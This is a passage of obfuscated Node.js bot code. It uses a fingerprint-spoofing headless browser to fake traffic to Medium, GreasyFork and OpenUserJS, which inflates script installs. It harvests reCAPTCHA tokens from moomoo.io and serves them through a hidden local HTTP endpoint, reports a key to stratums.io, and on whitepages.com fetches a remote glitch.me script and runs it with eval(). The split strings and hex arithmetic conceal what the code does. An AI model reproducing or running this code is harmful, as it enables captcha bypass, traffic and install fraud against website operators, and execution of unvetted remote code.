      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + a0(0x1e, 'rK3Q') + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': Y(0x14) + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x8) + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x1c) + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': a0(0x2, 'GdMj') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + Z(0xf) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + Z(0xb) + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + Y(0x1b) + Z(0x1a) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + a0(0x4, 'uJA0') + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x19a3 + -0x6a + -0x1a0d * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x17c7 + -0xce5 * -0x1 + -0x24ac)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const a1 = d;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return a1(0x1) == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + a2(0x19, 'H^xY'));
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xd * -0xa3 + 0x1a13 + 0x7 * -0x4da), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1577 + 0x3 * -0x477 + -0x5e * -0x60), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x15f5 + -0x1e7e + 0x1cf * 0x1d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1215 * 0x2 + -0x1 * 0x12fd + -0x112d; w < getRandomInt(-0x1146 + 0x2 * -0xa + 0x115b, -0xaf8 + 0x641 + 0x4bc); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1c031 + -0x1d0e5 + 0xfb14);
        }
      }();
    }, 0x2185 + 0x1a7e + -0x3b9f * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1f2a + -0x1 * -0x1136 + 0xdf4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xce3 * 0x2 + 0x2e6 * 0x7 + -0x2e10, 0x2 * -0xea3 + -0x43 * 0x25 + 0x2727)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x13f * 0x47 + 0x6a51 + -0x22 * -0x2ec);
    }, -0xcce + 0x3a * 0x9d + 0x20 * -0xb3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a3 = c;
        try {
          let s = -0xb1a + -0x178b + -0xb5 * -0x31;
          const t = await m[a3(0x13) + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1c * 0xac + 0x7 * -0x283 + 0xa7d), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x11a0 + -0x47 * 0x52 + -0x2 * -0x142f), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x71b5a + -0x94b6a + 0x1 * 0xfebb0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0x16de + 0x2675 + -0x3cef);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a4 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x5 * -0x4a2 + -0x1 * 0x1922 + -0xb * -0x40);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + a4(0x0) + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xa * 0x97 + -0x1 * -0x1639 + 0x371 * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  const bm = {
      f: 0x17
    },
    a7 = d,
    a6 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2ab * 0xd + -0x87e * 0x1 + -0x346 * 0x8) {
        const a5 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A[a5(0x16, '[Znc')]('Firefox') + 'Firefox' ['length'] + (-0x17fc + -0x19d3 + 0x31d0));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xa4a + 0x375 * 0x9 + 0x14d3 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x79 * 0x37 + 0x358 + -0x1d57, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x68e * 0x2 + 0x1b5 * 0x1 + 0x183f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2f17 + 0xd9c * -0x5 + 0x9a33),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + a6(0x7) + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + a6(0x1f) + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a7(0xe) + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + a7(bm.f) + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x155 + -0x458 + 0x303; k < 0x1 * -0xe7f + 0x3 * 0x509 + 0x26 * -0x4; k++)
    setTimeout(f, (0xf * 0x257 + -0x1 * 0x10133 + 0x1c87a) * k * getRandomInt(0x864 + -0x628 * 0x4 + 0x103d, 0x26d * -0xf + 0xf80 + 0x14e6));
  setInterval(() => {
    f();
    for (let l = 0x1569 + 0x1 * 0x1bc9 + -0x3132; l < -0x1fa6 + 0x223e + 0x3 * -0xdc; l++)
      setTimeout(f, (-0x25 * 0x95 + 0x5 * -0x2fdd + 0x1ef3a) * l * getRandomInt(-0xfe0 * 0x1 + -0x14 * -0xf5 + -0x343, -0x1 * -0xfc6 + 0xfca + -0x1f8d));
  }, 0x435130 + -0x1 * -0x2240aa + 0x1751ad * -0x2);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
